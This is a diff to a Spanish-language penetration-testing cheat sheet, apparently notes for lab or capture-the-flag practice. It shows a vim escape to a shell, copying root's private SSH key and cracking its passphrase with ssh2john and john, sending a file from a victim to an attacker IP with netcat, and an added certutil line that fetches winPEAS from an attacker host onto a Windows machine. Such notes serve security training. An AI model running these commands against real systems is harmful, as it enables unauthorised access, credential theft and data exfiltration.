@@ -51,5 +51,10 @@ vim -c una vez dentro ejecutar: ':!/bin/sh'
 /root/.ssh/id_rsa y copiar la clave a nuestra máquina atacante para posteriormente hashear esa clave e intentar sacar la contraseña por el hash. -> ssh2john ficherodondeguardamoslakey > salidaficherohasheado            john ficherohasheado –wordlist /usr/share/wordlist/rockyou   Para terminar, una vez obtengamos la contraseña nos podemos conectar desde la atacante usando el fichero con la clave privada sudo ssh root@ip -i ficheroconlakey
 Enviar ficheros por netcat (Victima) nc -q 0 192.168.16.37 9999 < BurgerWithoutCheese.zip (atacante) nc -nvlp 9999 > BurgerWithoutCheese.zip
 
+**Compartir ficheros con máquinas Windows**
+certutil -urlcache -split -f http://192.168.200.3/winPEASx64.exe C:\Users\hacker\Documents\winpeas.exe
+
+
+
 **Página donde ver ataque de fuerza bruta con hydra a diferentes tipos de login**
 [Hydra Brute Force Login Attacks](https://www.manrajbansal.com/post/how-to-use-hydra-to-brute-force-login-forms)
